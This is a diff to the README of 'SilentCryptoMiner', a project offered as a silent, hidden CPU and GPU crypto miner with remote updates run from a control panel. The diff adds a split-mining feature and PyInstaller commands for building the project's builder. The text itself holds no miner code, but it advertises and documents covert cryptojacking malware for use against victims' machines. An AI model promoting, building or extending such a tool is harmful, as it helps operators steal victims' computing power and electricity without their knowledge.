@@ -1,3 +1,4 @@
+<img width="1488" height="1124" alt="image" src="https://github.com/user-attachments/assets/d6d5869c-3480-4c94-a1d1-80aafd267e34" />
 ### Information
 
 SilentCryptoMiner is an open source, silent crypto miner. The readme will detail features of the project. For precompiled builds, check the release page.
@@ -16,6 +17,8 @@ Features
  - Hidden CPU Mining + GPU Mining with selective miner inclusion
 
  - GUI Builder (WOW I know)
+
+ - Split Mining (To split the mining, you must specify a mining percentage (1–99) in the second configuration file; the default is 50/50.)
 
  - Remote Update Feature, Update your miners from the panel itself
  
@@ -37,6 +40,10 @@ Installation
 
 python -m pip install --upgrade pip
 python -m pip install PySide6 PyInstaller pyaes
+
+### Create Builder
+python -m PyInstaller --noconfirm --clean --onefile --windowed --name "MyApp" --icon "icon.ico" --add-data "icon.ico:." "main.py"
+Builder creating in dist
 
 ### Issues
 If you notice a bug or any other issue that isn't installation, please feel free to find me at t.me/corvusminer, or open an issue on github.
